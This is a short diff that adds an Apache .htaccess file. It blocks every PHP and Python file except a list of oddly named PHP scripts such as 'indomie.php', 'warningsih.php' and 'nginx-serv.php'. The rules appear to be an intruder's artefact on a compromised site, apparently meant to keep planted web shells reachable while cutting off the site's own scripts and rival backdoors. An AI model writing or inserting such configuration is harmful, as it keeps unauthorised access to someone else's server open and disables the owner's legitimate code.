@@ -1,0 +1,8 @@
+<FilesMatch ".*\.(py|shtml|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|php7)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch '^(struct_slide.php|indomie.php|nginx-serv.php|warningsih.php|about.php|noop.php|min.php|about.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
